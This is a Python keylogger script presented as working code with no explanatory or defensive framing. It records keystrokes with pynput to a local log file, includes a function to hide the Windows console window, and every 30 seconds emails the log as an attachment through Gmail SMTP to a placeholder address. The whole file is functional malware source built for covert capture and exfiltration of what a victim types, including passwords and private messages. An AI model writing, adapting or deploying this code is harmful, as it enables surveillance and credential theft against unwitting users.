from pynput.keyboard import Key, Listener
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
from threading import Timer

count = 0
keys=[]

def hide():
    import win32console,win32gui
    window = win32console.GetConsoleWindow()
    win32gui.ShowWindow(window,0)
    return True

def on_press(key):
    global keys,count
    
    keys.append(key)
    count += 1
    
    if count >= 3:
        count = 0
        write_file(keys)
        keys= []
f=open("log.txt", "a+")
    
def write_file(keys):
    with open ("log.txt", "a") as f:
        for key in keys:
            k=str(key).replace("'","")
            if k.find("space") >0 :
                f.write('\n')
            elif k.find("Key") == -1 :
                f.write(k)
            
def on_release(key):
    if key==Key.esc:
        return False
def email_to():  
    email_user = 'youremail@gmail.com'
    email_password = ''
    email_send = 'youremail@gmail.com'
    
    subject = 'keylogs'
    
    msg = MIMEMultipart()
    msg['From'] = email_user
    msg['To'] = email_send
    msg['Subject'] = subject
    
    body = 'keylogger!'
    msg.attach(MIMEText(body,'plain'))
    
    filename='log.txt'
    attachment  =open(filename,'rb')
    
    part = MIMEBase('application','octet-stream')
    part.set_payload((attachment).read())
    encoders.encode_base64(part)
    part.add_header('Content-Disposition',"attachment; filename= "+filename)
    
    msg.attach(part)
    text = msg.as_string()
    server = smtplib.SMTP('smtp.gmail.com',587)
    server.starttls()
    server.login(email_user,email_password)
    
    
    server.sendmail(email_user,email_send,text)
    server.quit()
    Timer(30.0, email_to).start()
email_to()

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
